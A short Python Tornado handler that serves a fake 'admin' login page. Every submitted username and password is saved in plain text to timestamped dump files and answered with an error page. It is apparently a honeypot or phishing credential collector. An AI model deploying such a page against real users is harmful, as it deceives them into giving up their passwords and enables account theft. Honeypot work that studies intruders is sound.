# -*- coding: utf-8 -*-

import os
import time
from tornado import web


class MainHandler(web.RequestHandler):
    """MainHandler handle root and unknown endpoints

    GET give the index page
    POST try to save login and password and send the error page
    """

    def initialize(self, page_path: str = ''):
        self.page_path = page_path

    @web.asynchronous
    async def data_received(self, chunk):
        pass

    @web.asynchronous
    async def get(self):
        # self.render('../pages/' + self.page_path + 'admin.html')
        with open('./pages/' + self.page_path + 'admin.html', mode='r', encoding='UTF-8') as page:
            self.write(page.read())

    def post(self):
        try:
            login = self.get_argument('login')
            password = self.get_argument('password')
            try:
                if not os.path.exists('../logs/dump/' + self.page_path):
                    if not os.path.exists('../logs/dump'):
                        if not os.path.exists('../logs'):
                            os.mkdir('../logs')
                        os.mkdir('../logs/dump')
                    os.mkdir('../logs/dump/' + self.page_path)
                with open('../logs/dump/' + self.page_path + str(time.time()), mode='a+', encoding='UTF-8') as file:
                    file.write('login:' + login + '\npassword:' + password + '\n')
            except IOError:
                print(self.page_path[:-1])
                print('login :', login)
                print('password :', password)
        except web.HTTPError:   # no or wrong arguments
            pass
        # show an error page to the client
        # self.render('../pages/' + self.page_path + 'error.html')
        with open('./pages/' + self.page_path + 'error.html', mode='r', encoding='UTF-8') as page:
            self.write(page.read())
